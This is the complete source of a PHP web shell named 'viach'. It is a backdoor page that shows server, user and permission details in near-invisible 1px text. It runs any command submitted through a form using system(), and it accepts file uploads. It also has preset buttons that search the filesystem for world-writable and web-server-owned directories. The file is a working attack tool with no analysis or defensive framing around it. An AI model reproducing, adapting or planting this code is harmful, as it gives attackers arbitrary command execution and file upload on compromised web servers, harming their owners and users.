<html>
<head>
<body text="red" bgcolor="white">
<title>viach</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<?php
print "<style>body{text:blue;bgcolor:white;font-family:tahoma ms;font-size:1px;}hr{width:50%;height:1px;}</style>";
  closelog( );
  $user = get_current_user( );
  $login = posix_getuid( );
  $euid = posix_geteuid( );
  $ver = phpversion( );
  $gid = posix_getgid( );
  if ($chdir == "") $chdir = getcwd( );
  if(!$whoami)$whoami=exec("whoami");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php
  $uname = posix_uname( );
  while (list($info, $value) = each ($uname)) {
?>
  <TR>
    <TD align="left"><DIV STYLE="font-family: verdana; font-size: 1px;"><b><span style="font-size: 1pt"><?= $info ?>
      <span style="font-size: 1pt">:</b> <?= $value ?></span></DIV></TD>
  </TR>
<?php
  }
?>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 1px;"><b>
    <span style="font-size: 1pt">Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>(<?= $whoami?>) gid=<?= $gid ?>(<?= $whoami?>)</span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 1px;"><b>
    <span style="font-size: 1pt">Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?>
    </span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 1px;"><b>
    <span style="font-size: 1pt">Permision:</b> <? if(@is_writable($chdir)){ echo "Yes"; 

}else{ echo "No"; } ?>
    </span></DIV></TD>
  </TR>  
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 1px;"><b>
    <span style="font-size: 1pt">Address:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?>
    </span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 1px;"><b>
    <span style="font-size: 1pt">User:</b> <?= $user ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 1px;"><b>
    <span style="font-size: 1pt">Version:</b> <?= $ver ?></span></DIV></TD>
  </TR>
</TABLE>
</b>
</div></font></div>
<?php

set_magic_quotes_runtime(0);

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

if( $_POST['_act'] == "List" ) {
    $currentCMD = "ls -la";
}

if( $_POST['_act'] == "IP" ) {
    $currentCMD = "/sbin/ifconfig|grep inet";
}

if( $_POST['_act'] == "Proses" ) {
    $currentCMD = "ps -wx";
}
if( $_POST['_act'] == "Memory" ) {
    $currentCMD = "free";
}

if( $_POST['_act'] == "777" ) {
    $currentCMD = "find / -perm 777 -type d";
}

if( $_POST['_act'] == "nobody" ) {
    $currentCMD = "find / -user nobody -type d";
}

if( $_POST['_act'] == "apache" ) {
    $currentCMD = "find / -user apache -type d";
}

if( $_POST['_act'] == "httpd" ) {
    $currentCMD = "find / -user httpd -type d";
}

if( $_POST['_act'] == "www" ) {
    $currentCMD = "find / -user www -type d";
}

if( $_POST['_act'] == "www-data" ) {
    $currentCMD = "find / -user www-data -type d";
}

print "<form method=post enctype=\"multipart/form-data\"><table>";

print "<tr><td><b>Command:</b></td><td><input size=20 name=\"_cmd\" 

value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Run\"></td></tr>";

print "<tr><td><b>Directory:</b></td><td><input size=15 name=\"_cwd\" 

value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List\"></td></tr>";

print "<tr><td><b>Upload file:</b></td><td><input size=10 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload\"></td></tr>";

print "<tr><td><b>Find:</b></td>";
print "<td><input type=submit name=_act value=\"IP\"><b> <b><input type=submit name=_act 

value=\"Proses\"><b> <b><input type=submit name=_act value=\"777\"><b> <b><input type=submit 

name=_act value=\"nobody\"><b> <b><input type=submit name=_act value=\"apache\"><b> <b><input 

type=submit name=_act value=\"httpd\"><b> <b><input type=submit name=_act value=\"www\"><b> 

<b><input type=submit name=_act value=\"www-data\"></td></tr>";

print "</table></form>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "Upload" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Failed!!!</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>Succes!!!</b></center>";
    }    
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
  system("$currentCMD 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm 
/tmp/cmdtemp");
    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><center><b>#viach[at]byroe.net</b></center>";
}

exit;

?>